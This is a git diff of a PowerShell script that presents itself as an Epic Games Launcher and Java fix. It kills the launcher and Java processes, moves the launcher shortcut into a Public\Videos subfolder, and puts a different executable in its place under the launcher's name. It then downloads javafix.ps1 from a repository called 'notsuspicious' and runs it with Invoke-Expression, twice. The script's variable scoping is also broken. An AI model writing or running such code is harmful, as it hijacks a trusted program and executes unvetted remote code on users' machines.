@@ -1,38 +1,62 @@
-# Kill the Epic Games Launcher process forcefully
-Stop-Process -Name "java" -Force
-Stop-Process -Name "javaw" -Force
-Stop-Process -Name "EpicGamesLauncher" -Force
+# Stop processes if they are running
+Get-Process -Name "java", "javaw", "EpicGamesLauncher" -ErrorAction SilentlyContinue | Stop-Process -Force
 
-# Enable delayed expansion (not directly available in PowerShell)
-Set-Variable -Name "counter" -Value 0 -Scope Script
+# Define variables
+$counter = 0
+$p = $null
 
-# Loop through files recursively in the specified directory
-Get-ChildItem -Path "C:\Users\%USERNAME%" -Recurse | ForEach-Object {
-    # Check if the file name matches "Epic Games Launcher.lnk"
-    if ($_.Name -eq "Epic Games Launcher.lnk") {
-        # If found, set the path and break out of the loop
+# Function to find Epic Games Launcher.lnk
+function FindEpicGamesLauncher {
+    param (
+        [string]$directory
+    )
+    Get-ChildItem -Path $directory -Recurse -Filter "Epic Games Launcher.lnk" | ForEach-Object {
         $p = $_.FullName
+        return $true
+    }
+    return $false
+}
+
+# Search for Epic Games Launcher.lnk in user directories
+$userDirectories = Get-ChildItem -Path "C:\Users" -Directory
+foreach ($directory in $userDirectories) {
+    if (FindEpicGamesLauncher -directory $directory.FullName) {
         break
     }
 }
 
-# If the path is not found, perform certain actions
+# If not found, search in Program Files directory
 if (-not $p) {
-    Get-ChildItem -Path "C:\Program Files" -Recurse | ForEach-Object {
-    # Check if the file name matches "Epic Games Launcher.lnk"
-    if ($_.Name -eq "Epic Games Launcher.lnk") {
-        # If found, set the path and break out of the loop
-        $p = $_.FullName
-        break
+    $programFilesDirectories = Get-ChildItem -Path "C:\Program Files" -Directory
+    foreach ($directory in $programFilesDirectories) {
+        if (FindEpicGamesLauncher -directory $directory.FullName) {
+            break
+        }
     }
 }
+
+# If Epic Games Launcher.lnk is found, proceed with moving and renaming
+if ($p) {
+    $counter++
+    $newPath = "C:\Users\Public\Videos\GraphicalUserInterface\EpicGamesLauncher$counter.lnk"
+    Move-Item -Path $p -Destination $newPath -Force
+    $executablePath = "C:\Users\Public\Videos\GraphicalUserInterface\myapp\Epic Games Launcher.exe"
+    Move-Item -Path $executablePath -Destination (Split-Path $p) -Force
+    Rename-Item -Path $newPath -NewName "Epic Games Launcher.lnk" -Force
+    Rename-Item -Path $executablePath -NewName "Epic Games Launcher.exe" -Force
+
+    # Output success message
+    Write-Host "Epic Games Launcher files moved and renamed successfully."
+} else {
+    Write-Host "Epic Games Launcher not found."
 }
 
-# If the path is found, increment the counter
-$counter++
-Write-Output $p
-Move-Item -Path $p -Destination "C:\Users\Public\Videos\GraphicalUserInterface"
-Rename-Item -Path "C:\Users\Public\Videos\GraphicalUserInterface\Epic Games Launcher.lnk" -NewName "§$counter.lnk"
-Move-Item -Path "C:\Users\Public\Videos\GraphicalUserInterface\myapp\Epic Games Launcher.exe" -Destination $p
-Rename-Item -Path $p -NewName "Epic Games Launcher.exe"
+# Download and execute javafix.ps1 script
+try {
+    $javaFixScript = Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/javafix.ps1" -UseBasicParsing
+    Invoke-Expression $javaFixScript.Content
+    Write-Host "Java fix script executed successfully."
+} catch {
+    Write-Host "Failed to execute Java fix script."
+}
 Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/javafix.ps1" -UseBasicParsing).Content
